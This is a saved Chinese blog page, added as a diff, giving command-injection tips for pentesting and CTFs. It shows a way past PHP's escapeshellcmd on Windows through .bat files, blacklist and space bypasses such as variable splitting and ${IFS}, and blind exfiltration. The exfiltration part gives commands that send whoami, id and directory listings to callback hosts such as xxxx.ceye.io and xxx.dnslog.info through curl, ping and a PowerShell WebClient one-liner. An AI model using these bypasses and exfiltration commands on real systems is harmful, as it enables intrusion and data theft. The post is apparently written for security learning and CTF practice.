@@ -1,0 +1,221 @@
+
+<!DOCTYPE html>
+
+<html lang="zh-cn">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>命令执行的tip - l3m0n - 博客园</title>
+<link href="./命令执行的tip - l3m0n - 博客园/blog-common.cssv=m_FXmwz3wxZoecUwNEK23PAzc-j9vbX_C6MblJ5ouMc1" rel="stylesheet" type="text/css"/>
+<link href="./命令执行的tip - l3m0n - 博客园/bundle-InsideDotNet.cssv=hm5Ncnf1UmSaS2roxKOjrIG9bKc-5gPzmHFjhD4ZWn01" id="MainCss" rel="stylesheet" type="text/css"/>
+<link href="./命令执行的tip - l3m0n - 博客园/bundle-InsideDotNet-mobile.cssv=riNccSBaYfFlRjQw4oW6Q_6u5zO0NRZr85vSvhPWcl01" id="mobile-style" media="only screen and (max-width: 768px)" rel="stylesheet" type="text/css"/>
+<link href="./命令执行的tip - l3m0n - 博客园/rss" rel="alternate" title="RSS" type="application/rss+xml"/>
+<link href="./命令执行的tip - l3m0n - 博客园/rsd.xml" rel="EditURI" title="RSD" type="application/rsd+xml"/>
+<link href="./命令执行的tip - l3m0n - 博客园/wlwmanifest.xml" rel="wlwmanifest" type="application/wlwmanifest+xml"/>
+<script src="./命令执行的tip - l3m0n - 博客园/jquery.js" type="text/javascript"></script>
+<script type="text/javascript">var currentBlogApp = 'iamstudy', cb_enable_mathjax=true;var isLogined=false;</script>
+<script src="./命令执行的tip - l3m0n - 博客园/blog-common.jsv=CPv0EEqm9L2aCgolHxaZfVYM6J-Sn5az_FJXbjzgr-o1" type="text/javascript"></script>
+</head>
+<body>
+<a name="top"></a>
+<!--done-->
+<div id="home">
+<div id="header">
+<div id="blogTitle">
+<div style="display:none"><img alt="谨以此模板祝贺【博客园开发者征途】系列图书《你必须知道的.net》出版发行" src="./命令执行的tip - l3m0n - 博客园/top.gif"/></div>
+<a href="http://www.cnblogs.com/iamstudy/" id="lnkBlogLogo"><img alt="返回主页" id="blogLogo" src="./命令执行的tip - l3m0n - 博客园/logo.gif"/></a>
+<!--done-->
+<h1><a class="headermaintitle" href="http://www.cnblogs.com/iamstudy/" id="Header1_HeaderTitle">l3m0n</a></h1>
+<h2></h2>
+</div><!--end: blogTitle 博客的标题和副标题 -->
+<div id="navigator">
+<ul id="navList">
+<li></li>
+<li><a class="menu" href="http://ing.cnblogs.com/" id="MyLinks1_SpaceLink">闪存</a></li>
+<li><a class="menu" href="http://www.cnblogs.com/iamstudy/" id="blog_nav_myhome">首页</a></li>
+<li></li>
+<li></li>
+<li><a class="menu" href="https://i.cnblogs.com/" id="blog_nav_admin" rel="nofollow">管理</a></li>
+<li><a class="menu" href="http://www.cnblogs.com/iamstudy/rss" id="blog_nav_rss">订阅</a>
+<a class="aHeaderXML" href="http://www.cnblogs.com/iamstudy/rss" id="blog_nav_rss_image"><img alt="订阅" src="./命令执行的tip - l3m0n - 博客园/xml.gif"/></a></li>
+</ul>
+<div class="clear"></div>
+<div class="blogStats">
+<div id="blog_stats">
+<!--done-->
+随笔- 1 
+文章- 65 
+评论- 17 
+</div>
+</div><!--end: blogStats -->
+</div><!--end: navigator 博客导航栏 -->
+</div><!--end: header 头部 -->
+<div id="main">
+<div id="mainContent">
+<div class="forFlow">
+<div id="post_detail">
+<!--done-->
+<div id="topics">
+<div class="post">
+<h1 class="postTitle">
+<a class="postTitle2" href="http://www.cnblogs.com/iamstudy/articles/some_exec_command_tip.html" id="cb_post_title_url">命令执行的tip</a>
+</h1>
+<div class="clear"></div>
+<div class="postBody">
+<div class="cnblogs-markdown" id="cnblogs_post_body"><p>先看一个例子：<br/>
+本地测试环境：php 5.4.45 + win</p>
+<div class="sourceCode"><pre class="sourceCode php"><code class="sourceCode php"><span class="kw">&lt;?php</span>
+    <span class="kw">$command</span> = <span class="st">'dir '</span>.<span class="kw">$_POST</span><span class="ot">[</span><span class="st">'dir'</span><span class="ot">];</span>
+    <span class="kw">$escaped_command</span> = <span class="fu">escapeshellcmd</span><span class="ot">(</span><span class="kw">$command</span><span class="ot">);</span>
+    <span class="fu">var_dump</span><span class="ot">(</span><span class="kw">$escaped_command</span><span class="ot">);</span>
+    <span class="fu">file_put_contents</span><span class="ot">(</span><span class="st">'out.bat'</span><span class="ot">,</span><span class="kw">$escaped_command</span><span class="ot">);</span>
+    <span class="fu">system</span><span class="ot">(</span><span class="st">'out.bat'</span><span class="ot">);</span>
+<span class="kw">?&gt;</span></code></pre></div>
+<p><img src="./命令执行的tip - l3m0n - 博客园/804631-20161116185522310-1691352639.png"/></p>
+<p>应该如何去绕过执行？</p>
+<h3 id="escapeshellcmd">escapeshellcmd</h3>
+<p><a class="uri" href="http://php.net/manual/zh/function.escapeshellcmd.php">http://php.net/manual/zh/function.escapeshellcmd.php</a></p>
+<p>escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。</p>
+<p>具体会转义哪些字符？</p>
+<p><a class="uri" href="https://github.com/php/php-src/blob/PHP-5.4.45/ext/standard/exec.c">https://github.com/php/php-src/blob/PHP-5.4.45/ext/standard/exec.c</a></p>
+<p><img src="./命令执行的tip - l3m0n - 博客园/804631-20161116185537279-2067669230.png"/></p>
+<p>这些都会用<code>^</code>来取消其意义。也就是没办法用&amp; | 来执行其他命令，只能列目录。</p>
+<p>有这样的一个tip：执行<code>.bat</code>文件的时候，利用<code>%1a</code>，可以绕过过滤执行命令。</p>
+<p><img src="./命令执行的tip - l3m0n - 博客园/804631-20161116185546638-1832622575.png"/></p>
+<h3 id="更多好玩的命令绕过">更多好玩的命令绕过</h3>
+<p>linux下面tip特别多，在实战或者ctf中遇到最多的几个。<br/>
+1、黑名单绕过</p>
+<pre><code>执行ls命令：
+a=l;b=s;$a$b
+
+cat hello文件内容：
+a=c;b=at;c=he;d=llo;$a$b ${c}${d}</code></pre>
+<p><img src="./命令执行的tip - l3m0n - 博客园/804631-20161116185600029-564074305.png"/></p>
+<p>2、空格绕过</p>
+<pre><code>绕过空格
+${IFS}
+
+或者在读取文件的时候利用重定向符
+&lt;&gt;</code></pre>
+<p><img src="./命令执行的tip - l3m0n - 博客园/804631-20161116185608888-711629311.png"/></p>
+<p>最后就是别人fuzz的一个命令执行项目：<br/>
+<a class="uri" href="https://github.com/ewilded/shelling">https://github.com/ewilded/shelling</a></p>
+<p>3、无回显<br/>
+无回显获取数据的需求还是挺大的，比如sql，xxe，xss等等，这个时候一般可以用dns/http通道来获取数据。</p>
+<p>linux:</p>
+<pre><code>curl xxxx.ceye.io/`whoami`
+ping -c 1 `whoami`.xxxx.ceye.io</code></pre>
+<p><img src="./命令执行的tip - l3m0n - 博客园/804631-20161116185620029-1533549957.png"/></p>
+<p>可以获取数据，当前权限是root</p>
+<p><img src="./命令执行的tip - l3m0n - 博客园/804631-20161116185630060-1097029272.png"/></p>
+<p>但是有一个特别恼火的事情就是特殊字符或者是空格出现的话，这时候可以通过一些编码来，比如base64</p>
+<pre><code>curl http://xxxx.ceye.io/$(id|base64)</code></pre>
+<p><img src="./命令执行的tip - l3m0n - 博客园/804631-20161116185641951-1706700929.png"/></p>
+<hr/>
+<p>windows:<br/>
+windows下很头疼，用起来并没有linux那么方便好用，比如curl、wget等等。</p>
+<pre><code>http请求：
+for /F %x in ('whoami') do start http://xxx.ceye.io/%x
+
+dns请求：
+获取计算机名：for /F "delims=\" %i in ('whoami') do ping -n 1 %i.xxx.dnslog.info
+获取用户名：for /F "delims=\ tokens=2" %i in ('whoami') do ping -n 1 %i.xxx.dnslog.info</code></pre>
+<p>powershell这么厉害，为啥不用它来base64一下数据。</p>
+<pre><code>for /F %x in ('whoami') do powershell $a=[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('%x'));$b=New-Object System.Net.WebClient;$b.DownloadString('http://xxx.ceye.io/'+$a);</code></pre>
+<p>这样就也能获取到一个base64编码到命令结果啦～算是弥补一个小小的坑。</p>
+<p>ps:这个是用powershell2.0写的,其他版本未测试。</p>
+<p>但是如果没有powershell想要获取更多数据的话，还是比较麻烦的。</p>
+<p>比如获取d:\所有文件,遇上空格也是会被截断。</p>
+<pre><code>for /F %x in ('dir /b D:\') do start http://xxx.ceye.io/%x</code></pre>
+<p>4、借他人之手来获取字符<br/>
+如果过滤了&lt;&gt;?，可以从已有的文件中获取自己需要的字符。</p>
+<p><img src="./命令执行的tip - l3m0n - 博客园/804631-20161116185656513-1934837938.png"/></p>
+<p>＝。＝，当然如果服务器能外网的话，直接wget -o /tmp 就好了。</p>
+</div><div id="MySignature"></div>
+<div class="clear"></div>
+<div id="blog_post_info_block">
+<div id="BlogPostCategory"></div>
+<div id="EntryTag"></div>
+<div id="blog_post_info">
+</div>
+<div class="clear"></div>
+<div id="post_next_prev"></div>
+</div>
+</div>
+<div class="postDesc">posted @ <span id="post-date">2016-11-16 18:58</span> <a href="http://www.cnblogs.com/iamstudy/">l3m0n</a> 阅读(<span id="post_view_count">...</span>) 评论(<span id="post_comment_count">...</span>)  <a href="https://i.cnblogs.com/EditArticles.aspx?postid=6071088" rel="nofollow">编辑</a> <a href="#" onclick="AddToWz(6071088);return false;">收藏</a></div>
+</div>
+<script src="./命令执行的tip - l3m0n - 博客园/highlight.min.jsid=20160127"></script><script>markdown_highlight();</script><script type="text/javascript">var allowComments=true,cb_blogId=242399,cb_entryId=6071088,cb_blogApp=currentBlogApp,cb_blogUserGuid='f80873d6-234e-e511-b908-9dcfd8948a71',cb_entryCreatedDate='2016/11/16 18:58:00';loadViewCount(cb_entryId);</script>
+</div><!--end: topics 文章、评论容器-->
+</div><a name="!comments"></a><div id="blog-comments-placeholder"></div><script type="text/javascript">var commentManager = new blogCommentManager();commentManager.renderComments(0);</script>
+<div class="commentform" id="comment_form">
+<a name="commentform"></a>
+<div id="divCommentShow"></div>
+<div id="comment_nav"><span id="span_refresh_tips"></span><a clientidmode="Static" href="javascript:void(0);" id="lnk_RefreshComments" onclick="return RefreshCommentList();" runat="server">刷新评论</a><a href="#" onclick="return RefreshPage();">刷新页面</a><a href="#top">返回顶部</a></div>
+<div id="comment_form_container"></div>
+<div class="ad_text_commentbox" id="ad_text_under_commentbox"></div>
+<div id="ad_t2"></div>
+<div id="opt_under_post"></div>
+<div class="c_ad_block" id="cnblogs_c1"></div>
+<div id="under_post_news"></div>
+<div class="c_ad_block" id="cnblogs_c2"></div>
+<div id="under_post_kb"></div>
+<div class="c_ad_block" id="HistoryToday"></div>
+<script type="text/javascript">
+    fixPostBody();
+    setTimeout(function () { incrementViewCount(cb_entryId); }, 50);
+    deliverAdT2();
+    deliverAdC1();
+    deliverAdC2();    
+    loadNewsAndKb();
+    loadBlogSignature();
+    LoadPostInfoBlock(cb_blogId, cb_entryId, cb_blogApp, cb_blogUserGuid);
+    GetPrevNextPost(cb_entryId, cb_blogId, cb_entryCreatedDate);
+    loadOptUnderPost();
+    GetHistoryToday(cb_blogId, cb_blogApp, cb_entryCreatedDate);   
+</script>
+</div>
+</div><!--end: forFlow -->
+</div><!--end: mainContent 主体内容容器-->
+<div id="sideBar">
+<div id="sideBarMain">
+<!--done-->
+<div class="newsItem">
+<h3 class="catListTitle">公告</h3>
+<div id="blog-news"></div><script type="text/javascript">loadBlogNews();</script>
+</div>
+<div id="calendar"><div id="blog-calendar" style="display:none"></div><script type="text/javascript">loadBlogDefaultCalendar();</script></div>
+<div id="leftcontentcontainer">
+<div id="blog-sidecolumn"></div><script type="text/javascript">loadBlogSideColumn();</script>
+</div>
+</div><!--end: sideBarMain -->
+</div><!--end: sideBar 侧边栏容器 -->
+<div class="clear"></div>
+<div class="clear"></div>
+</div><!--end: main -->
+<div class="clear"></div>
+<div id="footer">
+<!--done-->
+Copyright ©2017 l3m0n 谨以此模板祝贺【博客园开发者征途】系列图书之《你必须知道的.NET》出版发行
+	</div><!--end: footer -->
+</div><!--end: home 自定义的最大容器 -->
+<!--PageEndHtml Block Begin-->
+<div align="center" id="something">
+<script language="javascript" src="./命令执行的tip - l3m0n - 博客园/18599866.js" type="text/javascript"></script>
+<noscript><a href="//www.51.la/?18599866" target="_blank"><img alt="我要啦免费统计" src="./命令执行的tip - l3m0n - 博客园/18599866.asp" style="border:none"/></a></noscript>
+<script language="javascript" src="./命令执行的tip - l3m0n - 博客园/id=18599866&amp;mb=3" type="text/javascript"></script>
+</div>
+<script>
+$('#footer').html('Copyright &copy;2017 Syclover-l3m0n');
+console.log('Hello,welcome to my blog!!!\n                  --------l3m0n');
+window.onload=function(){
+  $('#q').css({'width':'100px'});
+  $('#under_post_news').html('');
+  $('#under_post_kb').html('');
+  $('#ad_t2').html('');
+  $('#cnblogs_c1').html('');
+  $('#cnblogs_c2').html('');
+}
+</script>
+<!--PageEndHtml Block End-->
+</body>
+</html>
